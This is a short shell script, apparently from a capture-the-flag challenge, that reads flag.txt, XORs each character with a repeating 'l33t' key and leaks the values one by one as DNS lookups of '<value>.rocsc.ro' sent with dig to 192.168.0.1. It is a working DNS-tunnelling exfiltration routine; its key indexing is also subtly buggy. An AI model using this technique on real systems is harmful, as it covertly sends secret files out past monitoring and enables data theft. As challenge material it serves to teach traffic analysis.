KEY='l33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33t'
FLAG_CONTENT="$(cat flag.txt)"

LEN=$(printf %s "$KEY" | wc -c)
echo $LEN
F_LEN=$(printf %s "$FLAG_CONTENT" | wc -c)

i=0
while [ "$i" -lt "$F_LEN" ]
do
      char="$(printf %s "$FLAG_CONTENT" | cut -b $((i + 1)))"
  echo $char
    ascii=$(printf '%d' "'$char")
  
  echo $ascii
    k_idx=$((i+1 % LEN))
  k_char="$(printf %s \"$KEY\" | cut -b $((k_idx + 1)))"
  k_ascii=$(printf '%d' "'$k_char")
  echo $k_char
  xored_val=$((ascii ^ k_ascii))
  echo $xored_val
    dig +short "${xored_val}.rocsc.ro" @192.168.0.1

    sleep 0.1

  i=$((i + 1))
done
